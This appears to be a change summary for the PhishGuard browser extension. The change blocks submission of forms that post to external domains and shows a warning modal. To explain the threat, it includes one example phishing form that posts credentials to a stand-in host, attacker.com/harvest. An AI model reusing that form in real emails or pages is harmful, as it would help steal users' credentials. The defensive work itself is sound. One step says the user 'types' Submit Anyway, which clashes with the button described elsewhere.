# Credential Submission Blocking

## What was added

**`content.js`**
- `attachSubmitBlocker(form, externalDomain)` - attaches a capture-phase `submit` listener to every form flagged as external. Calls `e.preventDefault()` and `e.stopImmediatePropagation()` to halt submission before any inline `onsubmit` handlers run.
- `showSubmitBlockerDialog(externalDomain, onConfirm)` - renders a full-screen modal overlay with:
  - The external destination domain displayed in a monospace block
  - Three reasons explaining why the form is dangerous
  - A primary "Cancel (Stay Safe)" button (focused automatically for keyboard users)
  - A de-emphasized "Submit Anyway" button that only calls `onConfirm()` after the overlay is removed
  - Backdrop click and Escape key dismissal (both map to Cancel, not Confirm)

**`styles.css`**
- `#phishguard-dialog-overlay` - fixed full-screen backdrop (`z-index: 2147483647`) with semi-transparent dark fill
- `.phishguard-dialog` - modal card with `border-top: 3px solid #c0392b` danger indicator, matching the extension's dark theme
- `.phishguard-dlg-domain` - monospace domain display block, styled like the tooltip's domain value
- `.phishguard-dlg-reasons` - indicator list, same border-left style as tooltip indicator lists
- `.phishguard-btn-safe` / `.phishguard-btn-risk` - two-button action row; safe is visually dominant (green fill), risk is recessed (ghost border, dark red text)

## What was improved

**`injectFormWarning(form, externalDomain)`** in `content.js`:
- Now calls `attachSubmitBlocker(form, externalDomain)` after injecting the banner
- Previously the warning banner was purely informational; users could still submit the form freely

**Banner label** corrected from `"PhishGuard - Suspicious Form"` (em dash removed per project style rule).

## Why

Detecting and labeling a suspicious form without blocking it is a half-measure. A user who notices the banner might still submit — intentionally or by clicking a pre-filled Submit button before the banner is fully visible. Attackers count on this: the form is embedded in a visually legitimate-looking email, and a small warning label is easy to overlook.

**The attack flow this closes:**

1. Phisher embeds `<form action="https://attacker.com/harvest" method="POST">` in an HTML email
2. User opens the email, sees a fake "Verify your account" form
3. User fills in credentials and clicks Submit
4. Without this feature: data is sent to `attacker.com` silently
5. With this feature: submit is intercepted in capture phase, modal blocks the page, user must explicitly type "Submit Anyway" — a deliberate, friction-heavy action

**Why capture phase:**
Inline `onsubmit` handlers and form libraries attach listeners in the bubble phase. A capture-phase listener fires first, before any of those, ensuring the block cannot be bypassed by the host page's own event wiring.

**Why `form.submit()` in the confirm path (not `form.requestSubmit()`):**
`form.requestSubmit()` re-fires the submit event, which would re-trigger the blocker (even after `removeEventListener`) if the listener was already removed in a race condition. `form.submit()` bypasses the event entirely and submits directly, giving a clean one-way confirmation path.

**Why the "Submit Anyway" button is visually recessed:**
Deliberate friction. The safe path (Cancel) is the visually dominant action. A user who genuinely wants to submit must make an active choice against the visual hierarchy.

## Files changed

| File | Change |
|---|---|
| `content.js` | Added `attachSubmitBlocker()` and `showSubmitBlockerDialog()`; updated `injectFormWarning()` to call `attachSubmitBlocker` |
| `styles.css` | Added `#phishguard-dialog-overlay`, `.phishguard-dialog`, `.phishguard-dlg-*`, `.phishguard-btn-safe`, `.phishguard-btn-risk` |
